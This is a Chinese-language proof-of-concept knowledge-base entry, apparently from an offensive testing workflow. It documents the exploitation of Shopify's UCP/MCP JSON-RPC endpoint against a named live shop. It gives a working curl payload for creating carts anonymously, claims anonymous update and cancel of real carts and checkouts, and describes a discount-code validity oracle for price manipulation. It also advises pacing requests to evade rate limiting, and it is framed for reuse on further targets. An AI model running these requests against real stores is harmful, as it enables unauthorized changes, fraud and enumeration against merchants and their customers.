# Shopify UCP/MCP agent-profile 自绕利用深度：匿名 update/cancel 成立 + 折扣码校验 oracle + complete_checkout/get_order JWT 上限

- **code**: shopify-ucp-mcp-anon-write-depth-discount-oracle-jwt-ceiling
- **kind**: poc
- **category**: unauthorized
- **component**: Shopify UCP / MCP (JSON-RPC 2.0 /api/ucp/mcp)
- **severity**: medium
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 在 gamers-delight-online.myshopify.com 实测（fact#580，finding#490）：零 Cookie/JWT，profile=<shop>/.well-known/ucp 自绕后 create_cart/create_checkout 落成真实 GID+key（Cart hWNJ1jw12DCVYBdv9w2ho60G?key=26fa106b…、Checkout hWNJ1jwPa2uGjCLS2vKxDBzE?key=304c321d…）；update_cart 改 buyer.email 回显 success；cancel_checkout→canceled、cancel_cart→success；连续 create_cart ×6 = 6/6 唯一真实 GID；update_cart discounts.codes=[X] 回显 discounts.applied=[] + discount_code_invalid（匿名校验 oracle）；complete_checkout/get_order → HTTP 403 AuthenticationRequired；UCP get_cart 不带 key→invalid_cart_id、错 key→cart_not_found（UCP 正确校验 key，非 GraphQL 的 lax 读路径）；~25 次后 HTTP429 retry after 880s。
- **tags**: shopify,ucp,mcp,unauthorized,agent-profile,json-rpc,cart,checkout,discount-oracle,jwt
- **created_at**: 2026-11-11T14:48:15.235Z
- **engine**: https://gamers-delight-online.myshopify.com/api/ucp/mcp

## 描述

在 kb#518（门禁自绕）基础上补充该端点的利用深度与上限，供后续 Shopify UCP/MCP 目标直接判读：① 匿名写面不止 create_*，update_cart/cancel_cart/cancel_checkout 同样零凭据可对真实对象做状态变更/取消；② update_cart 传 discounts.codes 是匿名折扣码有效性 oracle（applied 非空=有效），命中有效码即改结账金额（价格操纵面）；③ 持久化上限：complete_checkout 与 get_order 被 JWT 门禁 403 拦（profile 自绕不作用于订单/完成结账），纯 SaaS 无落地路径 → 只能当可复用未认证调用通道，非驻留据点；④ UCP 的 get_cart/get_checkout 反而正确校验 ?key，别把 GraphQL 的 lax 读缺陷套到 UCP 上；⑤ 限流约 25 次触发 429（880s），滥用/枚举需单线程≥2.5s。

## 用法

```
EP=https://<shop>.myshopify.com/api/ucp/mcp; PROFILE=https://<shop>/.well-known/ucp
# 匿名落成 cart（回显真实 GID+key）
curl -s $EP -H 'Content-Type: application/json' -H 'Accept: application/json, text/event-stream' -d "{\"jsonrpc\":\"2.0\",\"id\":2,\"method\":\"tools/call\",\"params\":{\"name\":\"create_cart\",\"arguments\":{\"meta\":{\"ucp-agent\":{\"profile\":\"$PROFILE\"}},\"cart\":{\"line_items\":[{\"item\":{\"id\":\"gid://shopify/ProductVariant/<id>\"},\"quantity\":1}],\"buyer\":{\"email\":\"probe@example.com\"}}}}}"
# 匿名状态变更/取消：update_cart / cancel_cart / cancel_checkout（arguments: meta + id[+cart]）
# 折扣码 oracle：update_cart 传 cart.discounts.codes，看 discounts.applied 是否非空
# 上限判据：complete_checkout/get_order → 403 AuthenticationRequired（JWT 门禁，绕不过）
```
